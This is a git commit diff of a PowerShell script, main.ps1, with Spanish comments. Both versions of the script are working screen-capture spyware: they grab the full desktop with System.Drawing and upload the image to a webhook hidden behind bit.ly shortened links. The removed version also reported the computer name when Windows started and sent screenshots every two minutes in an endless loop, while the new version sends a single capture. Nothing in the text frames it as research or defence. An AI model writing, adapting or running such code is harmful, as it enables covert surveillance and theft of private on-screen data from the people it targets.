f13a64c797fc7c4b2357b2e663de427a9e66a380
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-10 19:32:51 -0500

    main.ps1

--- main.ps1
+++ main.ps1
@@ -1,61 +1,36 @@
-# URL del webhook principal
-$mainWebhookUrl = "https://bit.ly/web_chupakbras"
-# URL del webhook secundario
-$secondaryWebhookUrl = "https://bit.ly/web_chupacabras"
-$seconds = 120  # Intervalo de captura de pantalla en segundos
-$numberOfScreenshots = 3  # Cantidad de capturas de pantalla a enviar
+$hookurl = "https://bit.ly/web_chupakbras"
+$seconds = 30 # Intervalo de captura de pantalla en segundos
+$a = 1 # Cantidad de capturas de pantalla a enviar
 
-# Función para tomar y enviar capturas de pantalla
-function TakeAndSendScreenshots {
-    $TempFolder = "$env:temp\sysw"
-    
-    # Crea la carpeta temporal si no existe
-    if (-not (Test-Path -Path $TempFolder)) {
-        New-Item -ItemType Directory -Path $TempFolder | Out-Null
-    }
-    
-    # Obtiene la resolución de la pantalla
+# Detectar URL acortada
+if ($hookurl.Length -ne 121) {
+    Write-Host "URL del Webhook acortada detectada..."
+    $hookurl = (Invoke-RestMethod -Uri $hookurl).url
+}
+
+while ($a -gt 0) {
+    $Filett = "$env:temp\SC.png"
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
     $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
     $Width = $Screen.Width
     $Height = $Screen.Height
     $Left = $Screen.Left
     $Top = $Screen.Top
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    Start-Sleep 1
     
-    # Toma las capturas de pantalla y las envía al webhook
-    for ($i = 1; $i -le $numberOfScreenshots; $i++) {
-        $Filett = "$TempFolder\SC$i.png"
-        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
-        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
-        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
-        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
-        Start-Sleep 1
-        
-        try {
-            Write-Host "Enviando imagen $i..."
-            curl.exe -F "file1=@$Filett" $mainWebhookUrl
-            Remove-Item -Path $Filett -ErrorAction SilentlyContinue
-        } catch {
-            Write-Host "Error al enviar la imagen $i al webhook: $_"
-        }
-    }
-}
-
-# Función para enviar mensaje al webhook principal al iniciar Windows
-function SendMessageOnStartup {
     try {
-        Write-Host "Enviando mensaje al webhook principal..."
-        $message = "El PC está encendido: $($env:COMPUTERNAME)"
-        Invoke-RestMethod -Uri $mainWebhookUrl -Method Post -Body @{message=$message} -ContentType 'application/json'
+        Write-Host "Enviando imagen..."
+        Invoke-RestMethod -Uri $hookurl -Method Post -InFile $Filett
+        Remove-Item -Path $Filett -ErrorAction SilentlyContinue
     } catch {
-        Write-Host "Error al enviar el mensaje al webhook principal: $_"
+        Write-Host "Error al enviar la imagen al webhook: $_"
     }
-}
-
-# Enviar mensaje al webhook principal al iniciar Windows
-SendMessageOnStartup
-
-# Ejecuta la función para tomar y enviar capturas de pantalla cada 120 segundos
-while ($true) {
-    TakeAndSendScreenshots
-    Start-Sleep -Seconds $seconds
+    
+    Start-Sleep $seconds
+    $a--
 }
